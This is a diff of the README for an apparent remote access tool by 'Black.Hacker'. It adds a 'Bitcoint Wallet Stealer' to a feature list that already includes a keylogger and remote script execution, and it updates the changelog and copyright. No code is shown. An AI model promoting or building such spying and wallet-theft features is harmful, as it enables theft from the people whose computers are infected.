@@ -35,12 +35,12 @@ Developed By: Black.Hacker
  8. Keylogger
  9. Execute Scripts
 10. Computer Oprations [ Restart, Shutdown, Logout ]
-11.
- 9. Uninstall Client
- 10. Move Client
- 11. Blacklist Client
- 12. Update Client
- 13. Close Client
+11. Bitcoint Wallet Stealer
+12. Uninstall Client
+13. Move Client
+14. Blacklist Client
+15. Update Client
+16. Close Client
  
 ## Requirements
 1. PHP >=  5.6
@@ -75,11 +75,11 @@ Developed By: Black.Hacker
 ## What's New
 
 ```
-
 Another Big and Stable Update
 Codename: Doomsday 💀
 
 
+v2.0.0
   + PHP
     - Now the PHP script is compatiable with 000webhost
     - Added the Ability to disable the panel
@@ -189,4 +189,4 @@ BTC: 3AssdTzfQEvLfU4viepBXFs6C2KSHgW79Q
 This project is licensed under the MIT License
 
 ## Copyright
-
+Copyright © Black.Hacker - 2020
